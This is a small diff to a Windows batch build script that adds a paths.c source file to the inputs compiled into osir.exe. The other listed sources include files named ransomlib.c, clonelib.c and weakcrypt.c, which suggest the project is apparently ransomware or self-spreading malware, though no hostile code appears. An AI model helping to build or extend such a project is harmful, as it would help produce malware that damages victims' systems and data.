@@ -11,7 +11,7 @@ REM the like to optimize.
 
 
 REM build arguments
-set INPUT=osir.c common\os.c common\web.c common\thirdparty\b64.c common\clonelib.c common\weakcrypt.c common\ransomlib.c common\crypt.c common\thirdparty\aes.c
+set INPUT=osir.c common\os.c common\web.c common\thirdparty\b64.c common\clonelib.c common\weakcrypt.c common\ransomlib.c common\crypt.c common\thirdparty\aes.c common\paths.c
 set OUTPUT=osir.exe
 set LIBS=-lws2_32 -ladvapi32
 
